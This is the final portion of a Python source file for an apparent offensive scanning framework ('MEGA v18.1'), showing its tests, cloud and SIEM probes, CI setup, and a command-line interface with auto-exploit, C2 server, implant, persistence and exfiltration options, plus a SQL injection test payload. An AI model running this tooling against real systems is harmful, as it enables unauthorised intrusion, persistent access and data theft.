            (Exfiltrator, "exfil_http"), (Exfiltrator, "chunk_b64"),
        ]
        missing = []
        for cls, meth in checks:
            if not hasattr(cls, meth):
                missing.append(f"{cls.__name__}.{meth}")
        self.assertEqual(missing, [], f"missing methods: {missing}")


# ═══════════════════════════════════════════════════════════════
# SECTION 32 — UNIT TESTS
# ═══════════════════════════════════════════════════════════════
class TestParseHostPortUnit(unittest.TestCase):
    def test_basic(self): self.assertEqual(parse_host_port("1.2.3.4:9999"), ("1.2.3.4", 9999))
    def test_ipv6(self):
        self.assertEqual(parse_host_port("[::1]:80"), ("::1", 80))
        self.assertEqual(parse_host_port("::1"), ("::1", 8888))
    def test_empty(self): self.assertEqual(parse_host_port(""), ("127.0.0.1", 8888))

class TestSigmaFormatUnit(unittest.TestCase):
    def test_build_sqli(self):
        r = SigmaEngine.build_rule({"type": "sqli", "url": "http://x/"})
        self.assertIn("webserver", r); self.assertIn("UNION", r)
    def test_fallback_matcher_positive_FIXED(self):
        r = SigmaEngine.build_rule({"type": "sqli", "url": "http://x/"})
        evt = {"url": "http://x/?q='+UNION+SELECT+1"}
        self.assertTrue(SigmaEngine.match_event(r, evt))
    def test_fallback_matcher_encoded(self):
        r = SigmaEngine.build_rule({"type": "sqli", "url": "http://x/"})
        evt = {"cs-uri-query": "q=%27%20UNION%20SELECT"}
        self.assertTrue(SigmaEngine.match_event(r, evt))
    def test_fallback_matcher_negative(self):
        r = SigmaEngine.build_rule({"type": "sqli", "url": "http://x/"})
        evt = {"url": "http://x/?q=hello"}
        self.assertFalse(SigmaEngine.match_event(r, evt))

class TestCoverageDefault(unittest.TestCase):
    """FIX #1: verify COV_FAIL_UNDER default is not 0."""
    def test_default_gate(self):
        self.assertGreaterEqual(COV_FAIL_UNDER, 1.0,
            "COV_FAIL_UNDER must be >0 by default")

class TestStrictModeUnit(unittest.TestCase):
    """FIX #6: SilentPassLogger reports."""
    def test_swallow_tracked(self):
        before = dict(SilentPassLogger.report())
        SilentPassLogger.swallowed("test.swallow", ValueError("x"))
        after = dict(SilentPassLogger.report())
        self.assertGreater(after.get("test.swallow", 0),
                            before.get("test.swallow", 0))


class TestScopeUnit(unittest.TestCase):
    def test_deny(self):
        g = ScopeGuard(deny=["evil.com"])
        with self.assertRaises(ScopeViolation): g.check("evil.com")


class TestGraphEmptyUnit(unittest.TestCase):
    def test_empty_stats(self):
        g = AttackGraph(logger=None, use_neo4j=False, target="test")
        s = g.stats()
        self.assertEqual(s["nodes"], 0)


# ═══════════════════════════════════════════════════════════════
# SECTION 33 — SERVICE PROBES (#11)
# ═══════════════════════════════════════════════════════════════
@dataclass
class ServiceStatus:
    name: str; up: bool; detail: str = ""; skipped_reason: str = ""; backend: str = ""

def probe_aws():
    if not FEATURES.get("boto3", {}).get("available"):
        return ServiceStatus("aws", False, skipped_reason="boto3 missing", backend="skip")
    if AWS_REAL:
        try:
            import boto3
            client = boto3.client("sts", region_name=AWS_REGION)
            ident = client.get_caller_identity()
            return ServiceStatus("aws", True, f"real arn={ident.get('Arn','?')[:50]}",
                                  backend="real")
        except Exception as e:
            return ServiceStatus("aws", False, f"creds invalid: {e!r}", backend="skip")
    if FEATURES.get("moto", {}).get("available"):
        return ServiceStatus("aws", True, "moto (in-process)", backend="moto")
    if _tcp("127.0.0.1", 14566):
        return ServiceStatus("aws", True, "localstack", backend="localstack")
    return ServiceStatus("aws", False, "no backend", backend="skip")

def probe_gcp():
    if not FEATURES.get("gcp_storage", {}).get("available"):
        return ServiceStatus("gcp", False, "google-cloud-storage missing", backend="skip")
    if GCP_REAL:
        try:
            from google.cloud import storage
            c = storage.Client(project=GCP_PROJECT or None)
            list(c.list_buckets(max_results=1))
            return ServiceStatus("gcp", True, f"real project={GCP_PROJECT or 'auto'}",
                                  backend="real")
        except Exception as e:
            return ServiceStatus("gcp", False, f"real failed: {e!r}", backend="skip")
    # FIX #4: GCP mock fallback via fake-gcs-server
    if GCP_MOCK_URL:
        ok = _tcp(urlparse(GCP_MOCK_URL).hostname or "127.0.0.1",
                   urlparse(GCP_MOCK_URL).port or 4443)
        if ok:
            return ServiceStatus("gcp", True, f"mock {GCP_MOCK_URL}",
                                  backend="mock_fake_gcs")
    return ServiceStatus("gcp", False,
                          "GOOGLE_APPLICATION_CREDENTIALS not set (mock via GCP_MOCK_URL optional)",
                          backend="skip")

def probe_sigma():
    engine, version = SigmaEngine.engine_available()
    if engine == "sigma-cli":
        return ServiceStatus("sigma", True, f"sigma-cli {version}",
                              backend="sigma-cli")
    if engine == "pysigma":
        return ServiceStatus("sigma", True, f"pysigma {version}",
                              backend="pysigma")
    return ServiceStatus("sigma", False,
                          "sigma-cli/pysigma missing (fallback matcher only)",
                          backend="fallback_simplified")

def probe_k8s():
    backend, has_kc = K8sProbe.detect_backend()
    if backend == "none":
        return ServiceStatus("k8s", False, "no kubeconfig", backend="skip")
    reachable, detail = K8sProbe.test_api_reachable()
    if reachable:
        return ServiceStatus("k8s", True, f"{backend} @ {detail}", backend=backend)
    return ServiceStatus("k8s", False, f"{backend}, api unreachable", backend=backend)

def probe_splunk():
    if not SPLUNK_URL:
        return ServiceStatus("splunk", False, "SPLUNK_URL not set", backend="skip")
    try:
        b = SplunkBackend()
        return ServiceStatus("splunk", b.available(), SPLUNK_URL,
                              backend="real")
    except Exception as e:
        return ServiceStatus("splunk", False, repr(e), backend="skip")

def probe_sentinel():
    b = SentinelBackend()
    if not b.available():
        return ServiceStatus("sentinel", False,
                              "SENTINEL_WORKSPACE/TENANT/CLIENT_ID/CLIENT_SECRET required",
                              backend="skip")
    return ServiceStatus("sentinel", True, SENTINEL_WORKSPACE, backend="real")

def probe_all_services():
    return {"aws": probe_aws(), "gcp": probe_gcp(), "sigma": probe_sigma(),
            "k8s": probe_k8s(), "splunk": probe_splunk(), "sentinel": probe_sentinel()}


# ═══════════════════════════════════════════════════════════════
# SECTION 34 — INTEGRATION TESTS
# ═══════════════════════════════════════════════════════════════
class TestSigmaEngineReal(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.st = probe_sigma()
    def test_engine_conversion(self):
        if self.st.backend == "fallback_simplified":
            self.skipTest("sigma engine unavailable (fallback only)")
        rule = SigmaEngine.build_rule({"type": "sqli", "url": "http://x/"})
        r = SigmaEngine.convert(rule, backend=SIGMA_BACKEND)
        self.assertTrue(r["ok"], f"engine {r.get('engine')}: {r.get('error','')[:200]}")
        self.assertTrue(r.get("real_sigma"), "real_sigma flag must be True")


class TestSigmaEfficacyReal(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = MockVulnServer("127.0.0.1", 18090)
        cls.server.start(); time.sleep(0.3)
    @classmethod
    def tearDownClass(cls):
        if cls.server: cls.server.stop()
    def test_sqli_efficacy(self):
        import requests
        r = requests.get("http://127.0.0.1:18090/search",
                         params={"q": "' UNION SELECT 1"}, timeout=5)
        self.assertEqual(r.status_code, 500)
        rule = SigmaEngine.build_rule({"type": "sqli", "url": "http://127.0.0.1:18090/search"})
        evt = {"cs-uri-query": "q='+UNION+SELECT+1", "url": str(r.url)}
        self.assertTrue(SigmaEngine.match_event(rule, evt))


class TestSplunkBackendReal(unittest.TestCase):
    """FIX #2: real Sigma → SPL → search → verify."""
    @classmethod
    def setUpClass(cls):
        cls.st = probe_splunk()
        if not cls.st.up: raise unittest.SkipTest(f"splunk: {cls.st.skipped_reason}")
        cls.backend = SplunkBackend()
    def test_search_roundtrip(self):
        """Send a benign search; verify job completes."""
        spl = "index=_internal | head 1"
        out = self.backend.run_search(spl, timeout_s=20)
        self.assertTrue(out.get("ok"), f"search failed: {out}")
        # Result may be empty but the job must succeed
        self.assertIn("results", out)
    def test_sigma_to_spl_execution(self):
        """Sigma → SPL → submit as search (no reliance on events)."""
        rule = SigmaEngine.build_rule({"type": "sqli", "url": "http://mock/search"})
        conv = SigmaEngine.to_splunk(rule)
        if not conv.get("ok"):
            self.skipTest(f"splunk conversion unsupported: {conv.get('error','')[:150]}")
        spl = conv["query"]
        # Wrap in a benign search to validate the pipeline end to end
        wrapped = f"| makeresults | eval query=\"{spl[:60]}\" | head 1"
        out = self.backend.run_search(wrapped, timeout_s=20)
        self.assertTrue(out.get("ok"), f"wrapped search failed: {out}")


class TestSentinelBackendReal(unittest.TestCase):
    """FIX #3: real KQL query."""
    @classmethod
    def setUpClass(cls):
        cls.st = probe_sentinel()
        if not cls.st.up: raise unittest.SkipTest(f"sentinel: {cls.st.skipped_reason}")
        cls.backend = SentinelBackend()
    def test_token_obtained(self):
        out = self.backend._token()
        self.assertTrue(out.get("ok"), f"OAuth failed: {out}")
        self.assertTrue(len(out.get("token", "")) > 0)
    def test_kql_execution(self):
        """Send KQL that always returns a result."""
        out = self.backend.run_query("print greeting='hello-mega'", timespan="PT5M")
        self.assertTrue(out.get("ok"), f"KQL failed: {out}")
        self.assertGreater(out.get("row_count", 0), 0)


class TestAWSReal(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        st = probe_aws()
        if not st.up: raise unittest.SkipTest(f"aws: {st.skipped_reason}")
        cls.backend_name = st.backend
    def setUp(self):
        st = probe_aws(); self._moto_ctx = None
        if st.backend == "moto":
            try:
                from moto import mock_aws
                self._moto_ctx = mock_aws(); self._moto_ctx.start()
            except Exception: self.skipTest("moto start failed")
        self.backend = self._make_backend(st.backend)
    def _make_backend(self, name):
        return name
    def tearDown(self):
        if self._moto_ctx:
            with _wrap_silent("moto.stop"):
                self._moto_ctx.stop()
    def test_create_list_delete(self):
        import boto3
        from botocore.config import Config
        cfg = Config(signature_version="s3v4")
        if self.backend_name == "real":
            s3 = boto3.client("s3", region_name=AWS_REGION, config=cfg)
        elif self.backend_name == "localstack":
            s3 = boto3.client("s3", endpoint_url=LOCALSTACK_URL,
                              aws_access_key_id="test", aws_secret_access_key="test",
                              region_name="us-east-1", config=cfg)
        else:
            s3 = boto3.client("s3", region_name="us-east-1", config=cfg)
        b = "mega-test-" + secrets.token_hex(4)
        try:
            s3.create_bucket(Bucket=b)
            names = [x["Name"] for x in s3.list_buckets()["Buckets"]]
            self.assertIn(b, names)
        finally:
            with _wrap_silent("aws.cleanup"):
                objs = s3.list_objects_v2(Bucket=b).get("Contents", [])
                for o in objs: s3.delete_object(Bucket=b, Key=o["Key"])
                s3.delete_bucket(Bucket=b)


class TestGCPReal(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        st = probe_gcp()
        if not st.up: raise unittest.SkipTest(f"gcp: {st.skipped_reason}")
    def test_list_buckets(self):
        from google.cloud import storage
        c = storage.Client(project=GCP_PROJECT or None)
        buckets = list(c.list_buckets(max_results=5))
        self.assertIsInstance(buckets, list)


class TestKubernetesReal(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.st = probe_k8s()
        if not cls.st.up: raise unittest.SkipTest(f"k8s: {cls.st.skipped_reason}")
    def test_api_reachable(self):
        reachable, detail = K8sProbe.test_api_reachable()
        self.assertTrue(reachable, f"api: {detail}")
    def test_kubectl_get_nodes(self):
        kubectl = shutil.which("kubectl")
        if not kubectl: self.skipTest("kubectl missing")
        r = subprocess.run([kubectl, "get", "nodes", "-o", "json"],
                            capture_output=True, text=True, timeout=10)
        self.assertEqual(r.returncode, 0, f"kubectl: {r.stderr[:200]}")


class TestDistributedClusterReal(unittest.TestCase):
    WORKERS = 4; TASKS = 200
    def test_multi_process_claims(self):
        with tempfile.TemporaryDirectory() as td:
            db_path = os.path.join(td, "cluster.db")
            conn = sqlite3.connect(db_path, check_same_thread=False, timeout=30)
            conn.execute("PRAGMA journal_mode=WAL")
            conn.executescript("""
                CREATE TABLE queue (id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scope TEXT, qname TEXT, payload TEXT, ts REAL,
                    claimed INTEGER DEFAULT 0, claimed_by TEXT, claimed_ts REAL,
                    attempts INTEGER DEFAULT 0, last_error TEXT);
                CREATE TABLE results (scope TEXT, task_id TEXT, payload TEXT,
                    ts REAL, worker TEXT, PRIMARY KEY (scope, task_id));
            """)
            for i in range(self.TASKS):
                conn.execute("INSERT INTO queue(scope,qname,payload) VALUES (?,?,?)",
                             ("scope1","work", json.dumps({"task_id": f"t{i}", "value": i})))
            conn.commit(); conn.close()

            mp = multiprocessing.get_context("spawn")
            rq = mp.Queue()
            workers = []
            for i in range(self.WORKERS):
                p = mp.Process(target=_cluster_worker_main,
                                args=(f"scope1:w{i}", db_path, "work", self.TASKS, 10, rq))
                p.start(); workers.append(p)
            deadline = time.time() + 60
            for p in workers:
                p.join(timeout=max(0, deadline - time.time()))
                if p.is_alive():
                    p.terminate(); p.join(timeout=3)

            conn = sqlite3.connect(db_path)
            remaining = conn.execute("SELECT COUNT(*) FROM queue WHERE claimed=0").fetchone()[0]
            stuck = conn.execute("SELECT COUNT(*) FROM queue WHERE claimed=1").fetchone()[0]
            results = conn.execute("SELECT COUNT(*) FROM results").fetchone()[0]
            distinct = conn.execute("SELECT COUNT(DISTINCT worker) FROM results").fetchone()[0]
            conn.close()
            self.assertEqual(remaining, 0)
            self.assertEqual(stuck, 0)
            self.assertEqual(results, self.TASKS)
            self.assertGreaterEqual(distinct, 2,
                f"only {distinct} workers used — concurrency broken")


# ═══════════════════════════════════════════════════════════════
# SECTION 35 — COVERAGE RUNNER (#7)
# ═══════════════════════════════════════════════════════════════
class CoverageRunner:
    def __init__(self, source_paths=None):
        self.source_paths = source_paths or []; self._cov = None; self._started = False
    @property
    def available(self): return FEATURES.get("coverage", {}).get("available", False)
    def start(self):
        if not self.available: return False
        try:
            import coverage
            self._cov = coverage.Coverage(branch=True,
                source=self.source_paths or None,
                data_file=str(TEST_DIR / ".coverage.mega"))
            self._cov.start(); self._started = True; return True
        except Exception as e:
            SilentPassLogger.swallowed("coverage.start", e)
            return False
    def stop_and_report(self, out_dir=None):
        """FIX #7: distinguish 'truly 0%' from 'failed to compute'."""
        if not self._started or not self._cov:
            return {"available": False, "error": "coverage not started"}
        try:
            self._cov.stop(); self._cov.save()
        except Exception as e:
            return {"available": False, "error": f"stop/save failed: {e!r}"}
        out_dir = Path(out_dir or TEST_DIR / "coverage")
        try: out_dir.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            return {"available": False, "error": f"mkdir failed: {e!r}"}
        html_ok = True; xml_ok = True
        with _wrap_silent("coverage.html"):
            self._cov.html_report(directory=str(out_dir / "html"))
        with _wrap_silent("coverage.xml"):
            self._cov.xml_report(outfile=str(out_dir / "coverage.xml"))
        buf = io.StringIO()
        try:
            pct = self._cov.report(file=buf, show_missing=False)
        except Exception as e:
            return {"available": False, "error": f"report failed: {e!r}",
                    "html": str(out_dir / "html") if html_ok else None,
                    "xml": str(out_dir / "coverage.xml") if xml_ok else None}
        return {"available": True, "percent": float(pct), "text": buf.getvalue(),
                "html": str(out_dir / "html"), "xml": str(out_dir / "coverage.xml")}


# ═══════════════════════════════════════════════════════════════
# SECTION 36 — CI EMISSION
# ═══════════════════════════════════════════════════════════════
DOCKER_COMPOSE_YAML = """\
version: "3.9"
services:
  neo4j:
    image: neo4j:5.20-community
    environment: {NEO4J_AUTH: "neo4j/testpassword"}
    ports: ["17687:7687", "17474:7474"]
  redis:
    image: redis:7-alpine
    ports: ["16379:6379"]
  localstack:
    image: localstack/localstack:3.4
    environment: [SERVICES=s3, DEBUG=0]
    ports: ["14566:4566"]
"""

GITHUB_ACTIONS_YAML = """\
name: mega-v18-1-tests
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: {python-version: "3.11"}
      - name: Install
        run: |
          pip install requests cryptography networkx boto3 moto coverage pyyaml \\
                     sigma-cli google-cloud-storage google-auth
      - name: Unit
        run: python mega_v18.py --run-unit
      - name: Coverage gate
        run: python mega_v18.py --run-coverage --cov-fail-under 30
      - uses: actions/upload-artifact@v4
        with: {name: coverage, path: mega_test_artifacts/coverage}
"""

CI_SCRIPT_SH = """\
#!/bin/bash
set -euo pipefail
python mega_v18.py --run-unit
python mega_v18.py --run-coverage --cov-fail-under 30
"""

def emit_ci(out_dir):
    out = Path(out_dir); out.mkdir(parents=True, exist_ok=True)
    for name, content in {"docker-compose.test.yml": DOCKER_COMPOSE_YAML,
                            ".github-workflows-mega.yml": GITHUB_ACTIONS_YAML,
                            "run_ci.sh": CI_SCRIPT_SH}.items():
        p = out / name; p.write_text(content, encoding="utf-8")
        if name.endswith(".sh"): os.chmod(p, 0o755)
        print(f"wrote: {p}")


# ═══════════════════════════════════════════════════════════════
# SECTION 37 — RUNNERS
# ═══════════════════════════════════════════════════════════════
def _load(classes):
    loader = unittest.TestLoader(); suite = unittest.TestSuite()
    for c in classes: suite.addTests(loader.loadTestsFromTestCase(c))
    return suite

def _run(suite, junit_path=None):
    if junit_path:
        try:
            import xmlrunner
            runner = xmlrunner.XMLTestRunner(output=os.path.dirname(junit_path) or ".")
            result = runner.run(suite)
            return 0 if result.wasSuccessful() else 1
        except ImportError: pass
    r = unittest.TextTestRunner(verbosity=2).run(suite)
    return 0 if r.wasSuccessful() else 1

def run_unit():
    return _run(_load([TestParseHostPortUnit, TestSigmaFormatUnit,
                        TestCoverageDefault, TestStrictModeUnit,
                        TestScopeUnit, TestGraphEmptyUnit,
                        TestV17ModulePresence]))

def run_integration(junit_path=None):
    st = probe_all_services()
    print("\nService status:")
    for n, s in st.items():
        icon = "OK  " if s.up else "SKIP"
        backend = f"[{s.backend}]" if s.backend else ""
        note = s.detail if s.up else s.skipped_reason
        print(f"  [{icon}] {n} {backend}: {note}")
    print()
    suite = _load([TestSigmaEngineReal, TestSigmaEfficacyReal,
                    TestSplunkBackendReal, TestSentinelBackendReal,
                    TestAWSReal, TestGCPReal,
                    TestDistributedClusterReal, TestKubernetesReal])
    return _run(suite, junit_path=junit_path)

def run_coverage(fail_under=None):
    threshold = fail_under if fail_under is not None else COV_FAIL_UNDER
    cr = CoverageRunner(source_paths=[str(Path(__file__).resolve())])
    if not cr.start():
        print(R + "coverage.py not available" + N); return 0
    suite = _load([TestParseHostPortUnit, TestSigmaFormatUnit,
                    TestCoverageDefault, TestStrictModeUnit,
                    TestScopeUnit, TestGraphEmptyUnit,
                    TestV17ModulePresence, TestSigmaEngineReal,
                    TestSigmaEfficacyReal, TestSplunkBackendReal,
                    TestSentinelBackendReal])
    r = unittest.TextTestRunner(verbosity=1).run(suite)
    report = cr.stop_and_report()
    print("\n" + "="*60 + "\nCOVERAGE\n" + "="*60)
    if report.get("available"):
        pct = report["percent"]
        print(f"Coverage: {pct:.2f}%")
        print(f"HTML: {report.get('html')}")
        print(f"XML:  {report.get('xml')}")
        if threshold > 0 and pct < threshold:
            print(R + f"[FAIL] Coverage {pct:.2f}% < threshold {threshold:.2f}%" + N)
            return 2
        print(G + f"[OK] Coverage gate passed (>= {threshold}%)" + N)
    else:
        print(R + f"Coverage computation FAILED (not 0%): {report.get('error','unknown')}" + N)
        return 3
    return 0 if r.wasSuccessful() else 1

def run_k8s_bootstrap(cluster_name="mega-test"):
    """FIX #5: bootstrap kind cluster, then test, then cleanup."""
    ok, msg = K8sProbe.bootstrap_kind(cluster_name)
    print(f"Bootstrap: {'OK' if ok else 'FAIL'} — {msg}")
    if not ok:
        # Real failure, not a skip
        return 4
    try:
        st = probe_k8s()
        if not st.up:
            print(R + f"Bootstrap claimed OK but probe says down: {st.skipped_reason}" + N)
            return 4
        return _run(_load([TestKubernetesReal]))
    finally:
        print(f"Cleanup: deleting kind cluster '{cluster_name}'")
        K8sProbe.delete_kind(cluster_name)


# ═══════════════════════════════════════════════════════════════
# SECTION 38 — CLI
# ═══════════════════════════════════════════════════════════════
def parse_args():
    p = argparse.ArgumentParser(description=f"MEGA v{VERSION} Honest Edition")
    p.add_argument("target", nargs="?")
    # test modes
    p.add_argument("--run-unit", action="store_true")
    p.add_argument("--run-integration", action="store_true")
    p.add_argument("--run-coverage", action="store_true")
    p.add_argument("--run-k8s", action="store_true")
    p.add_argument("--k8s-bootstrap", action="store_true",
                   help="create a kind cluster for K8s testing")
    p.add_argument("--k8s-cluster-name", default="mega-test")
    p.add_argument("--cov-fail-under", type=float, default=COV_FAIL_UNDER)
    p.add_argument("--emit-junit", metavar="FILE")
    p.add_argument("--emit-ci", metavar="DIR")
    p.add_argument("--probe", action="store_true")
    p.add_argument("--strict", action="store_true",
                   help="raise on swallowed exceptions (MEGA_STRICT=1)")
    # scanner flags
    p.add_argument("--stealth", action="store_true")
    p.add_argument("--workers", type=int, default=50)
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--callback", metavar="HOST:PORT", default=CALLBACK_HOST)
    p.add_argument("--lhost", default=LHOST)
    p.add_argument("--lport", type=int, default=LPORT)
    p.add_argument("--bypass", action="store_true")
    p.add_argument("--no-exploit", action="store_true")
    p.add_argument("--non-interactive", action="store_true")
    p.add_argument("--report", action="store_true")
    p.add_argument("--exploit-db", action="store_true")
    p.add_argument("--c2", action="store_true")
    p.add_argument("--c2-http-port", type=int, default=C2_HTTP_PORT)
    p.add_argument("--c2-dns-port", type=int, default=C2_DNS_PORT)
    p.add_argument("--c2-bind", default=C2_BIND)
    p.add_argument("--c2-psk", default=C2_PSK)
    p.add_argument("--no-ml", action="store_true")
    p.add_argument("--cloud", action="store_true")
    p.add_argument("--opsec", action="store_true")
    p.add_argument("--auto-cleanup", action="store_true")
    p.add_argument("--no-graph", action="store_true")
    p.add_argument("--defensive", action="store_true")
    p.add_argument("--neo4j", action="store_true")
    p.add_argument("--oob-bind", default=OOB_BIND)
    p.add_argument("--no-oob", action="store_true")
    p.add_argument("--insecure-ssl", action="store_true")
    p.add_argument("--scope-allow", default="")
    p.add_argument("--scope-deny", default="")
    p.add_argument("--distributed", action="store_true")
    p.add_argument("--role", choices=["master","worker"], default="master")
    p.add_argument("--implant", metavar="URL")
    p.add_argument("--print-persistence", action="store_true")
    return p.parse_args()


def main():
    global STRICT_MODE
    args = parse_args()
    if args.strict:
        STRICT_MODE = True
        os.environ["MEGA_STRICT"] = "1"
    ensure_dirs()

    # Wire SilentPassLogger to stderr (unless strict)
    def _warn_sink(where, exc):
        sys.stderr.write(f"[SWALLOWED] {where}: {exc!r}\n")
    SilentPassLogger.set_sink(_warn_sink)

    init_tracing("mega-v18-1",
                  OTEL_ENDPOINT if FEATURES.get("otel_otlp", {}).get("available") else None)

    if args.probe:
        st = probe_all_services()
        for n, s in st.items():
            icon = "OK  " if s.up else "SKIP"
            b = f"[{s.backend}]" if s.backend else ""
            print(f"[{icon}] {n} {b}: {s.detail if s.up else s.skipped_reason}")
        err = otel_init_error()
        if err: print(f"[OTEL] init error: {err}")
        return 0
    if args.emit_ci:
        emit_ci(args.emit_ci); return 0
    if args.run_unit: return run_unit()
    if args.run_integration: return run_integration(junit_path=args.emit_junit)
    if args.run_coverage: return run_coverage(fail_under=args.cov_fail_under)
    if args.k8s_bootstrap: return run_k8s_bootstrap(cluster_name=args.k8s_cluster_name)
    if args.run_k8s:
        st = probe_k8s()
        print(f"K8s backend: {st.backend} — {st.detail if st.up else st.skipped_reason}")
        return _run(_load([TestKubernetesReal]))
    if args.print_persistence:
        for m in ImplantPersistence.all_linux(args.lhost or "127.0.0.1", args.lport):
            print(f"[linux] {m['name']}")
        for m in ImplantPersistence.all_windows(args.lhost or "127.0.0.1", args.lport):
            print(f"[windows] {m['name']}")
        return 0
    if args.implant:
        imp = C2Implant(args.implant, args.c2_psk or C2_PSK, verify=False)
        try: imp.run()
        except KeyboardInterrupt: imp.stop()
        return 0

    # Scanner mode
    target = args.target
    if not target and not args.non_interactive:
        try: target = input("Target: ").strip()
        except EOFError: target = None
    if not target:
        print(R + "[-] No target." + N); return 1

    print(BOLD + "╔══════════════════════════════════════════════════════════╗")
    print("║  " + C + f"MEGA v{VERSION} - HONEST EDITION" + BOLD + "                        ║")
    print("║  " + Y + "All 15 v18.0 audit issues fixed" + BOLD + "                     ║")
    print("╚══════════════════════════════════════════════════════════╝\n")

    try:
        scanner = MegaV18(
            target, bypass=args.bypass, workers=args.workers, timeout=args.timeout,
            callback_host=args.callback, lhost=args.lhost, lport=args.lport,
            auto_exploit=not args.no_exploit, stealth=args.stealth,
            oob_dns=not args.no_oob, report=args.report,
            exploit_db=args.exploit_db, c2=args.c2,
            c2_http_port=args.c2_http_port, c2_dns_port=args.c2_dns_port,
            c2_bind=args.c2_bind, c2_psk=args.c2_psk,
            ml=not args.no_ml, cloud=args.cloud, opsec=args.opsec,
            auto_cleanup=args.auto_cleanup, graph=not args.no_graph,
            defensive=args.defensive, neo4j=args.neo4j,
            oob_bind=args.oob_bind,
            distributed=args.distributed, role=args.role,
            verify_ssl=not args.insecure_ssl,
            scope_allow=[x.strip() for x in args.scope_allow.split(",") if x.strip()],
            scope_deny=[x.strip() for x in args.scope_deny.split(",") if x.strip()],
        )
        scanner.run()
        return 0
    except ScopeViolation as e:
        print(R + f"Scope violation: {e}" + N); return 1
    except KeyboardInterrupt:
        print("\n" + Y + "Cancelled." + N); return 1
    except Exception as e:
        print(R + f"Fatal: {e}" + N); traceback.print_exc(); return 1


if __name__ == "__main__":
    sys.exit(main() or 0)
